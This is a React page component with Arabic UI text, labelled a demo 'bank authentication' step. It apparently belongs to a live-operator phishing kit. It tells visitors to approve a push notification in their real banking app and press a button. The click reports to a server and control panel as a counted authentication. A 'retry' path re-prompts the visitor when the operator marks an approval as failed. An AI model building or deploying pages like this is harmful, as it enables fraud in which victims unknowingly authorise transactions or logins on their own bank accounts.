/* صفحة المصادقة البنكية التجريبية — محاكاة إشعار التطبيق البنكي */
import { useState, useEffect } from "react";
import { useSearch } from "wouter";
import { toast } from "sonner";
import SiteLayout, { OrderSteps } from "@/components/SiteLayout";
import DemoBadge from "@/components/DemoBadge";
import WaitingScreen from "@/components/WaitingScreen";
import { upsertCurrentOrder, resetCurrentDirectiveToWait } from "@/lib/liveOrders";
import { Smartphone, Bell } from "lucide-react";

export default function BankAuth() {
  const search = useSearch();
  const isRetry = new URLSearchParams(search).get("retry") === "1";
  const [waiting, setWaiting] = useState(false);

  // عند العودة بعد رفض المصادقة: أعد ضبط التوجيه إلى wait حتى لا تتكرر الإعادة
  useEffect(() => {
    if (isRetry) {
      resetCurrentDirectiveToWait().catch(() => {});
      toast.error("لم يتم تأكيد المصادقة، يرجى المحاولة مرة أخرى وتأكيد الإشعار في تطبيقك البنكي.");
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [isRetry]);

  const confirm = async () => {
    // إرسال حالة المصادقة البنكية إلى الخادم ثم البقاء في الانتظار.
    // incAuth=true يزيد عداد المصادقة (صح أخضر جديد) في لوحة التحكم عند كل تأكيد.
    setWaiting(true);
    try {
      await upsertCurrentOrder({ page: "مصادقة بنكية", bankAuth: "مصادقة", directive: "wait", incAuth: true });
    } catch {
      /* تجاهل */
    }
  };

  if (waiting) {
    return (
      <SiteLayout>
        <WaitingScreen />
      </SiteLayout>
    );
  }

  return (
    <SiteLayout>
      <OrderSteps active={3} />
      <section className="container pb-16 max-w-md">
        <div className="text-center mb-6">
          <div className="mx-auto mb-3 h-12 w-12 rounded-2xl bg-gradient-to-br from-[#15120c] to-[#221d12] flex items-center justify-center">
            <Smartphone className="h-6 w-6 text-[#E6C766]" />
          </div>
          <h1 className="text-2xl font-extrabold text-foreground">المصادقة البنكية</h1>
          <DemoBadge className="mt-4" />
        </div>

        <div className="card-soft p-7 text-center">
          <div className="mx-auto mb-5 w-48 rounded-3xl border-4 border-[#15120c] bg-[#15120c] p-3 shadow-xl">
            <div className="rounded-2xl bg-white p-4">
              <Bell className="h-7 w-7 text-[#C9A227] mx-auto mb-2" />
              <p className="text-xs font-bold text-foreground">تطبيقك البنكي</p>
              <p className="text-[11px] text-muted-foreground mt-1">طلب مصادقة جديد بانتظار التأكيد</p>
            </div>
          </div>

          <p className="text-sm text-foreground/80 leading-relaxed mb-6">
            يرجى الدخول إلى تطبيقك البنكي والضغط على الإشعار الفوري لتأكيد الطلب، ثم اضغط الزر أدناه للمتابعة.
          </p>

          <button onClick={confirm} className="w-full btn-gold rounded-full py-3.5 text-sm font-bold">
            تأكيد المصادقة
          </button>
          <p className="mt-4 text-[11px] text-muted-foreground">بعد الموافقة على طلب المصادقة في تطبيق البنك، اضغط على الزر أعلاه للمتابعة.</p>
        </div>
      </section>
    </SiteLayout>
  );
}
